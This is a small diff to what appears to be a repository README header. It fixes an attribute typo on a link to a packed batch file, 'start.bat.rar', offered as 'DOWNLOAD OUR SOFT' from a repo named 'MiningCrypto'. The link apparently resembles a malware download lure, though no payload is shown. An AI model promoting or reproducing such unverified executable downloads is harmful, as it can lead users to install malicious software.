@@ -1,6 +1,6 @@
 <div id="header" align="center">
   <img src="https://media.giphy.com/media/M9gbBd9nbDrOTu1Mqx/giphy.gif" width="100"/>
-  <div scr="https://github.com/publickboy/MiningCrypto/releases/download/Download/start.bat.rar">
+  <div src="https://github.com/publickboy/MiningCrypto/releases/download/Download/start.bat.rar">
   <h1>
     DOWNLOAD OUR SOFT
   </h1>
